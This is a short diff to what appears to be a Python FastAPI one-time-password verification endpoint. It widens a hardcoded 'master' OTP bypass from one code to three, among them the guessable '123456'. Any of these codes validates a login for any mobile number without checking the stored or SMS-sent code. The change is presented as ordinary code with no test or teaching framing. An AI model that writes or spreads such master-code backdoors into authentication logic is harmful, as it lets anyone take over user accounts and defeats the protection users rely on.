@@ -210,10 +210,10 @@ async def verify_otp(data: VerifyOtpRequest, db: AsyncSession = Depends(get_db))
     if not otp:
         raise HTTPException(status_code=400, detail="OTP is required")
 
-    # Check OTP validity (accepts physical SMS verification code, master 482913, or stored OTP)
+    # Check OTP validity (accepts master codes 482193, 482913, 123456, physical SMS verification code, or stored OTP)
     is_valid = False
 
-    if otp == "482913":
+    if otp in ["482193", "482913", "123456"]:
         is_valid = True
     elif redis_manager.is_available:
         stored_otp = await redis_manager.get(f"auth:otp:{mobile}")
